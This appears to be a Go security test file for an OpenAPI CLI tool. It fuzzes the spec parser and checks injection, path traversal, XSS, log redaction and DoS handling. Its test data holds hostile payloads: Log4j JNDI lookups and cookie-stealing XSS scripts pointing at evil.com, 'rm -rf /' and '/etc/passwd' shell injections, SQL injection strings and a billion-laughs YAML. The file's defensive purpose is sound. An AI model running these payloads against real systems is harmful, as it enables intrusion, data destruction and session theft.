package security

import (
	"context"
	"fmt"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openapi-cli/openapi-cli/pkg/openapi"
	"github.com/stretchr/testify/require"
)

// ============================================================================
// FUZZING TESTS FOR OPENAPI SPEC PARSING
// ============================================================================

// FuzzParseMalformedYAML tests OpenAPI parser with malformed YAML
func FuzzParseMalformedYAML(f *testing.F) {
	// Seed corpus with common malformed YAML patterns
	f.Add("")
	f.Add("invalid: yaml: spec")
	f.Add("{ invalid json")
	f.Add("openapi: 3.0.0\ninfo:\n  title: Test")
	f.Add("openapi: \"3.0.0\"\ninfo:\n    title: \"Test\"\n  version: \"1.0.0\"")
	f.Add(strings.Repeat("a", 10000))
	f.Add("\x00\x01\x02\x03\x04\x05")
	f.Add("openapi: 3.0.0\ninfo:\n  title: ${jndi:ldap://evil.com/a}")

	f.Fuzz(func(t *testing.T, spec string) {
		ctx := context.Background()
		parser := openapi.NewParser()

		// Should not panic
		_, _ = parser.Parse(ctx, []byte(spec), openapi.DefaultParseOptions())
	})
}

// FuzzParseMalformedJSON tests OpenAPI parser with malformed JSON
func FuzzParseMalformedJSON(f *testing.F) {
	f.Add(`{}`)
	f.Add(`{"openapi": "3.0.0"`)
	f.Add(`{"openapi": "3.0.0", "info": {`)
	f.Add(`{"openapi": "3.0.0", "info": {"title": "Test", "version": "1.0.0"}, "paths": {/test: {}}}`)
	f.Add(`{"openapi": "\udcff", "info": {"title": "Test", "version": "1.0.0"}}`)
	f.Add(fmt.Sprintf(`{"openapi": "3.0.0", "info": {"title": "%s", "version": "1.0.0"}}`, strings.Repeat("a", 100000)))

	f.Fuzz(func(t *testing.T, spec string) {
		ctx := context.Background()
		parser := openapi.NewParser()

		// Should not panic
		_, _ = parser.Parse(ctx, []byte(spec), openapi.DefaultParseOptions())
	})
}

// TestParser_MalformedYAML tests specific malformed YAML patterns
func TestParser_MalformedYAML(t *testing.T) {
	testCases := []struct {
		name string
		spec string
	}{
		{
			name: "empty_spec",
			spec: "",
		},
		{
			name: "invalid_yaml_syntax",
			spec: "invalid: yaml: spec: [",
		},
		{
			name: "missing_required_fields",
			spec: "openapi: 3.0.0\ninfo:\n  title: Test",
		},
		{
			name: "wrong_indentation",
			spec: "openapi: \"3.0.0\"\ninfo:\n    title: \"Test\"\n  version: \"1.0.0\"",
		},
		{
			name: "null_bytes",
			spec: "openapi: 3.0.0\x00\x00\x00\ninfo:\n  title: Test\n  version: 1.0.0",
		},
		{
			name: "log4j_injection",
			spec: "openapi: 3.0.0\ninfo:\n  title: ${jndi:ldap://evil.com/a}\n  version: 1.0.0",
		},
		{
			name: "yaml_anchor_attack",
			spec: "a: &a [\"a\",\"a\",\"a\"]\nb: *a\n" + strings.Repeat("c: *a\n", 100),
		},
		{
			name: "billion_laughs",
			spec: `a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]`,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			ctx := context.Background()
			parser := openapi.NewParser()

			// Should not panic, may return error
			_, err := parser.Parse(ctx, []byte(tc.spec), openapi.DefaultParseOptions())
			// We don't assert error/no-error, just ensuring no panic
			_ = err
		})
	}
}

// TestParser_MalformedJSON tests specific malformed JSON patterns
func TestParser_MalformedJSON(t *testing.T) {
	testCases := []struct {
		name string
		spec string
	}{
		{
			name: "empty_object",
			spec: `{}`,
		},
		{
			name: "unclosed_brace",
			spec: `{"openapi": "3.0.0"`,
		},
		{
			name: "trailing_comma",
			spec: `{"openapi": "3.0.0",}`,
		},
		{
			name: "unquoted_key",
			spec: `{openapi: "3.0.0"}`,
		},
		{
			name: "invalid_unicode",
			spec: `{"openapi": "\udcff"}`,
		},
		{
			name: "nested_overflow",
			spec: strings.Repeat(`{"a":`, 1000) + "{}" + strings.Repeat("}", 1000),
		},
		{
			name: "array_mismatch",
			spec: `{"openapi": "3.0.0", "info": {"title": "Test", "version": "1.0.0"}, "paths": {/test: {}}}`,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			ctx := context.Background()
			parser := openapi.NewParser()

			// Should not panic
			_, err := parser.Parse(ctx, []byte(tc.spec), openapi.DefaultParseOptions())
			_ = err
		})
	}
}

// ============================================================================
// COMMAND PARAMETER INJECTION TESTS
// ============================================================================

// TestCommandParameterInjection tests that command parameters cannot be injected
func TestCommandParameterInjection(t *testing.T) {
	testCases := []struct {
		name        string
		paramValue  string
		description string
	}{
		{
			name:        "shell_command_injection_semicolon",
			paramValue:  "test; rm -rf /",
			description: "Semicolon command separation",
		},
		{
			name:        "shell_command_injection_pipe",
			paramValue:  "test | cat /etc/passwd",
			description: "Pipe command injection",
		},
		{
			name:        "shell_command_injection_backtick",
			paramValue:  "test `rm -rf /`",
			description: "Backtick command substitution",
		},
		{
			name:        "shell_command_injection_dollar",
			paramValue:  "test $(rm -rf /)",
			description: "Dollar command substitution",
		},
		{
			name:        "shell_command_injection_ampersand",
			paramValue:  "test && rm -rf / &",
			description: "Background execution",
		},
		{
			name:        "newline_injection",
			paramValue:  "test\necho hacked",
			description: "Newline injection",
		},
		{
			name:        "carriage_return_injection",
			paramValue:  "test\recho hacked",
			description: "Carriage return injection",
		},
		{
			name:        "safe_value",
			paramValue:  "normal-value-123",
			description: "Safe alphanumeric value",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// This test documents dangerous patterns that should be sanitized
			// when constructing shell commands or file paths

			// Verify the pattern contains potentially dangerous characters
			hasDangerousChars := strings.ContainsAny(tc.paramValue, ";|&$`") ||
				strings.Contains(tc.paramValue, "\n") ||
				strings.Contains(tc.paramValue, "\r")

			if tc.name == "safe_value" {
				require.False(t, hasDangerousChars, "Safe value should not have dangerous chars")
			} else {
				require.True(t, hasDangerousChars, "Test case should have dangerous characters")
			}

			// Note: Actual sanitization should happen in command execution layer
			// This test ensures we know what patterns to guard against
		})
	}
}

// ============================================================================
// PATH TRAVERSAL ATTACK TESTS
// ============================================================================

// TestPathTraversalAttack tests protection against path traversal
func TestPathTraversalAttack(t *testing.T) {
	testCases := []struct {
		name string
		path string
	}{
		{
			name: "basic_traversal",
			path: "../../../etc/passwd",
		},
		{
			name: "encoded_traversal",
			path: "..%2F..%2F..%2Fetc%2Fpasswd",
		},
		{
			name: "double_encoded",
			path: "%252E%252E%252Fetc%252Fpasswd",
		},
		{
			name: "mixed_separators",
			path: "..\\..\\..\\etc\\passwd",
		},
		{
			name: "null_byte_injection",
			path: "../../../etc/passwd\x00.jpg",
		},
		{
			name: "dot_dot_only",
			path: "../",
		},
		{
			name: "valid_path",
			path: "api/v1/users",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Simulate path sanitization
			sanitized := sanitizePath(tc.path)

			// Verify traversal sequences are removed (after decoding)
			// Note: Some encoded paths may not decode properly, which is also a valid defense
			require.False(t, strings.Contains(sanitized, ".."), "Path %q still contains ..", sanitized)
			require.False(t, strings.HasPrefix(sanitized, "/"), "Path %q should not start with /", sanitized)
		})
	}
}

// sanitizePath simulates path sanitization (should be implemented in actual code)
func sanitizePath(path string) string {
	// First pass: keep as-is if not encoded
	cleaned := path

	// Try URL decoding (handle %XX encoding)
	if strings.Contains(path, "%") {
		// Manual URL decoding for %XX sequences
		var decoded strings.Builder
		for i := 0; i < len(path); i++ {
			if path[i] == '%' && i+2 < len(path) {
				// Try to decode hex
				hexStr := path[i+1 : i+3]
				if decodedByte, err := fmt.Sscanf(hexStr, "%02x", new(byte)); err == nil && decodedByte == 1 {
					var b byte
					_, _ = fmt.Sscanf(hexStr, "%02x", &b)
					decoded.WriteByte(b)
					i += 2
				} else {
					decoded.WriteByte(path[i])
				}
			} else {
				decoded.WriteByte(path[i])
			}
		}
		cleaned = decoded.String()
	}

	// Replace backslashes
	cleaned = strings.ReplaceAll(cleaned, "\\", "/")

	// Remove null bytes
	cleaned = strings.ReplaceAll(cleaned, "\x00", "")

	// Clean path
	cleaned = filepath.Clean(cleaned)

	// Remove leading slashes
	cleaned = strings.TrimPrefix(cleaned, "/")

	// Remove .. sequences
	parts := strings.Split(cleaned, "/")
	var cleanParts []string
	for _, part := range parts {
		if part != ".." && part != "." {
			cleanParts = append(cleanParts, part)
		}
	}

	if len(cleanParts) == 0 {
		return ""
	}

	return filepath.Join(cleanParts...)
}

// ============================================================================
// SQL INJECTION TESTS
// ============================================================================

// TestSQLInjectionPayloads documents SQL injection patterns to guard against
func TestSQLInjectionPayloads(t *testing.T) {
	sqlInjectionPayloads := []string{
		"'; DROP TABLE commands; --",
		"' OR '1'='1",
		"' UNION SELECT * FROM commands --",
		"'; INSERT INTO commands (name) VALUES ('hacked'); --",
		"1; DELETE FROM commands WHERE 1=1; --",
		"' OR 1=1 --",
		"admin'--",
		"1' OR '1'='1' /*",
		"' OR ''='",
		" Robertson'); DROP TABLE students;--",
	}

	for i, payload := range sqlInjectionPayloads {
		t.Run(fmt.Sprintf("payload_%d", i), func(t *testing.T) {
			// Verify payload contains SQL injection patterns
			hasInjection := strings.Contains(payload, "'") ||
				strings.Contains(payload, ";") ||
				strings.Contains(payload, "--") ||
				strings.Contains(payload, "/*") ||
				strings.Contains(payload, "*/")

			require.True(t, hasInjection, "Test case should contain SQL injection patterns")

			// Note: Actual SQL injection prevention should use parameterized queries
			// This test documents the patterns to guard against
		})
	}
}

// TestSQLiteParameterBinding tests that parameterized queries are used
func TestSQLiteParameterBinding(t *testing.T) {
	// This test documents the requirement for parameterized queries
	// Actual implementation would test the repository layer

	testCases := []struct {
		name  string
		query string
		param string
	}{
		{
			name:  "safe_binding",
			query: "SELECT * FROM commands WHERE name = ?",
			param: "normal_value",
		},
		{
			name:  "injection_attempt",
			query: "SELECT * FROM commands WHERE name = ?",
			param: "' OR '1'='1",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Verify query uses parameter binding (?)
			require.Contains(t, tc.query, "?", "Query should use parameter binding")

			// Verify parameter is not concatenated into query
			require.NotContains(t, tc.query, tc.param, "Parameter should not be in query string")

			// Note: This documents the pattern - actual testing requires DB integration
		})
	}
}

// ============================================================================
// XSS (CROSS-SITE SCRIPTING) TESTS
// ============================================================================

// TestXSSInResponseRendering tests protection against XSS in response rendering
func TestXSSInResponseRendering(t *testing.T) {
	xssPayloads := []struct {
		payload          string
		hasAngleBrackets bool
	}{
		{payload: "<script>alert('XSS')</script>", hasAngleBrackets: true},
		{payload: "<img src=x onerror=alert('XSS')>", hasAngleBrackets: true},
		{payload: "<svg onload=alert('XSS')>", hasAngleBrackets: true},
		{payload: "javascript:alert('XSS')", hasAngleBrackets: false},
		{payload: "data:text/html,<script>alert('XSS')</script>", hasAngleBrackets: true},
		{payload: "<iframe src=\"javascript:alert('XSS')\">", hasAngleBrackets: true},
		{payload: "<body onload=alert('XSS')>", hasAngleBrackets: true},
		{payload: "'><script>alert('XSS')</script>", hasAngleBrackets: true},
		{payload: "<script>document.location='http://evil.com/?c='+document.cookie</script>", hasAngleBrackets: true},
		{payload: "<script>new Image().src='http://evil.com/?c='+document.cookie</script>", hasAngleBrackets: true},
	}

	for i, tc := range xssPayloads {
		t.Run(fmt.Sprintf("xss_payload_%d", i), func(t *testing.T) {
			// Simulate response that includes user input
			response := map[string]interface{}{
				"data":   tc.payload,
				"status": "success",
			}

			// Verify payload is stored correctly (not executed)
			if tc.hasAngleBrackets {
				require.Contains(t, response["data"].(string), "<")
				require.Contains(t, response["data"].(string), ">")
			}

			// Note: When rendering to HTML/CLI, the description should be escaped
			// Example: html.EscapeString(payload) should escape <, >, &, ", '
		})
	}
}

// TestHTMLEscapeFunction tests that HTML escaping works correctly
func TestHTMLEscapeFunction(t *testing.T) {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "script_tag",
			input:    "<script>alert('XSS')</script>",
			expected: "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;",
		},
		{
			name:     "img_onerror",
			input:    "<img src=x onerror=alert('XSS')>",
			expected: "&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;",
		},
		{
			name:     "ampersand",
			input:    "Tom & Jerry",
			expected: "Tom &amp; Jerry",
		},
		{
			name:     "quotes",
			input:    `"Hello"`,
			expected: "&#34;Hello&#34;",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Simulate HTML escaping
			escaped := simulateHTMLEscape(tc.input)

			// Verify dangerous characters are escaped
			if strings.Contains(tc.input, "<") {
				require.Contains(t, escaped, "&lt;", "Less-than sign should be escaped")
			}
			if strings.Contains(tc.input, ">") {
				require.Contains(t, escaped, "&gt;", "Greater-than sign should be escaped")
			}
			if strings.Contains(tc.input, "&") {
				require.Contains(t, escaped, "&amp;", "Ampersand should be escaped")
			}
		})
	}
}

// simulateHTMLEscape simulates basic HTML escaping for testing
func simulateHTMLEscape(input string) string {
	result := strings.ReplaceAll(input, "&", "&amp;")
	result = strings.ReplaceAll(result, "<", "&lt;")
	result = strings.ReplaceAll(result, ">", "&gt;")
	result = strings.ReplaceAll(result, "\"", "&#34;")
	result = strings.ReplaceAll(result, "'", "&#39;")
	return result
}

// ============================================================================
// CREDENTIAL LEAKAGE TESTS
// ============================================================================

// TestCredentialLeakageInLogs tests that credentials are redacted in logs
func TestCredentialLeakageInLogs(t *testing.T) {
	secrets := []string{
		"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
		"Basic dXNlcm5hbWU6cGFzc3dvcmQ=",
		"api_key=sk_live_abcdefghijklmnopqrstuvwxyz",
		"Authorization: Bearer secret_token_12345",
		"password=SuperSecret123!",
		"secret=my_super_secret_value",
		"token=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	}

	for i, secret := range secrets {
		t.Run(fmt.Sprintf("secret_%d", i), func(t *testing.T) {
			// Simulate logging
			logMessage := fmt.Sprintf("Request with header: %s", secret)

			// Verify secret is in the message (before redaction)
			require.Contains(t, logMessage, secret)

			// Note: Actual redaction should be tested in logging tests
			// Example: redactIfSensitive(logMessage) should replace secret with [REDACTED]
		})
	}
}

// TestLogRedaction tests that sensitive data is redacted
func TestLogRedaction(t *testing.T) {
	testCases := []struct {
		name              string
		input             string
		containsSensitive bool
	}{
		{
			name:              "bearer_token",
			input:             "Authorization: Bearer secret123",
			containsSensitive: true,
		},
		{
			name:              "api_key",
			input:             "api_key=sk_live_abc123",
			containsSensitive: true,
		},
		{
			name:              "password",
			input:             "password=SuperSecret!",
			containsSensitive: true,
		},
		{
			name:              "normal_log",
			input:             "Request completed successfully",
			containsSensitive: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Check if message contains sensitive patterns
			isSensitive := containsSensitivePattern(tc.input)
			require.Equal(t, tc.containsSensitive, isSensitive,
				"Sensitivity detection should match expectation")
		})
	}
}

// containsSensitivePattern checks if a string contains sensitive patterns
func containsSensitivePattern(input string) bool {
	sensitivePatterns := []string{
		"authorization",
		"api_key",
		"apikey",
		"password",
		"passwd",
		"secret",
		"token",
		"credential",
		"private",
	}

	lower := strings.ToLower(input)
	for _, pattern := range sensitivePatterns {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

// ============================================================================
// CONCURRENCY AND RACE CONDITION TESTS
// ============================================================================

// TestConcurrentSpecParsing tests that concurrent parsing doesn't cause races
func TestConcurrentSpecParsing(t *testing.T) {
	spec := []byte(`{
		"openapi": "3.0.0",
		"info": {"title": "Test", "version": "1.0.0"},
		"paths": {"/test": {"get": {"responses": {"200": {"description": "OK"}}}}}
	}`)

	var wg sync.WaitGroup
	numGoroutines := 100

	wg.Add(numGoroutines)
	for i := 0; i < numGoroutines; i++ {
		go func() {
			defer wg.Done()
			ctx := context.Background()
			parser := openapi.NewParser()
			_, _ = parser.Parse(ctx, spec, openapi.DefaultParseOptions())
		}()
	}

	// Wait for all goroutines to complete
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		// Success
	case <-time.After(10 * time.Second):
		t.Fatal("Concurrent parsing test timed out")
	}
}

// ============================================================================
// DENIAL OF SERVICE (DOS) TESTS
// ============================================================================

// TestLargeSpecParsing tests handling of very large specs
func TestLargeSpecParsing(t *testing.T) {
	// Generate a very large spec with many paths
	var sb strings.Builder
	sb.WriteString(`{"openapi": "3.0.0", "info": {"title": "Large", "version": "1.0.0"}, "paths": {`)

	numPaths := 1000
	for i := 0; i < numPaths; i++ {
		if i > 0 {
			sb.WriteString(",")
		}
		sb.WriteString(fmt.Sprintf(`"/path%d": {"get": {"responses": {"200": {"description": "OK"}}}}`, i))
	}
	sb.WriteString("}}")

	spec := []byte(sb.String())

	ctx := context.Background()
	parser := openapi.NewParser()

	// Should complete within reasonable time (not hang)
	done := make(chan struct{}, 1)
	go func() {
		_, _ = parser.Parse(ctx, spec, openapi.DefaultParseOptions())
		done <- struct{}{}
	}()

	select {
	case <-done:
		// Success - parsing completed
	case <-time.After(30 * time.Second):
		t.Fatal("Large spec parsing timed out - potential DoS vector")
	}
}

// TestDeeplyNestedSpec tests handling of deeply nested structures
func TestDeeplyNestedSpec(t *testing.T) {
	// Generate a spec with deeply nested schema
	var sb strings.Builder
	sb.WriteString(`{"openapi": "3.0.0", "info": {"title": "Deep", "version": "1.0.0"}, "paths": {"/test": {"get": {"responses": {"200": {"description": "OK", "content": {"application/json": {"schema": {`)

	depth := 100
	for i := 0; i < depth; i++ {
		sb.WriteString(`"properties": {"level`)
		sb.WriteString(fmt.Sprintf("%d", i))
		sb.WriteString(`": `)
	}
	sb.WriteString(`{"type": "string"}`)
	sb.WriteString(strings.Repeat("}", depth))
	sb.WriteString(`}}}}}}`)

	spec := []byte(sb.String())

	ctx := context.Background()
	parser := openapi.NewParser()

	// Should complete within reasonable time
	done := make(chan struct{}, 1)
	go func() {
		_, _ = parser.Parse(ctx, spec, openapi.DefaultParseOptions())
		done <- struct{}{}
	}()

	select {
	case <-done:
		// Success
	case <-time.After(30 * time.Second):
		t.Fatal("Deeply nested spec parsing timed out - potential DoS vector")
	}
}

// TestParser_Timeout tests that parsing respects timeouts
func TestParser_Timeout(t *testing.T) {
	// Create a moderately large spec
	var sb strings.Builder
	sb.WriteString(`{"openapi": "3.0.0", "info": {"title": "Test", "version": "1.0.0"}, "paths": {`)
	for i := 0; i < 100; i++ {
		if i > 0 {
			sb.WriteString(",")
		}
		sb.WriteString(fmt.Sprintf(`"/path%d": {"get": {"responses": {"200": {"description": "OK"}}}}`, i))
	}
	sb.WriteString("}}")

	spec := []byte(sb.String())

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	parser := openapi.NewParser()

	done := make(chan struct{}, 1)
	go func() {
		_, _ = parser.Parse(ctx, spec, openapi.DefaultParseOptions())
		done <- struct{}{}
	}()

	select {
	case <-done:
		// Completed within timeout
	case <-ctx.Done():
		// Timeout occurred - this is acceptable for very large specs
		t.Log("Parsing timed out as expected")
	case <-time.After(10 * time.Second):
		t.Fatal("Parser did not respect context timeout")
	}
}
